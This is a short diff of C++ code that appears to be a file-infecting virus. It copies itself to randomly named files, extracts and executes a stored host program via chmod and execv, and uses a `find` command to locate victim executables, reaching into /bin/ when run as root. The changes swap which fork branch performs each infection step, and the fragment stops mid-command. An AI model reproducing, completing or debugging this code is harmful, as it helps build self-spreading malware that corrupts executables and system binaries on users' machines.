@@ -21,7 +21,7 @@ int main (int argc, char** argv) {
         exe += (char) ((rand() % 26) + 65);
         vir += (char) ((rand() % 26) + 65);
     }
-    if (childpid > 0) {
+    if (childpid == 0) {
         ifstream fi(me);
         ofstream fv(vir);
         if (fi.is_open() && fv.is_open()) {
@@ -30,7 +30,7 @@ int main (int argc, char** argv) {
             fi.close();
         }
     }
-    if (childpid == 0) {
+    if (childpid > 0) {
         ifstream fi(me);
         ofstream fo(exe);
         fi.seekg(MYSIZE, fi.beg);
@@ -40,10 +40,10 @@ int main (int argc, char** argv) {
         command = "chmod u+x ";
         command += exe;
         c = system( command.c_str() );
-        c = execv((exe).c_str(), argv);
+        execv((exe).c_str(), argv);
         return 30;
     }
-    if (childpid > 0) {
+    if (childpid == 0) {
         command = "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
         command += "-mindepth 1 -maxdepth 1 -type f";
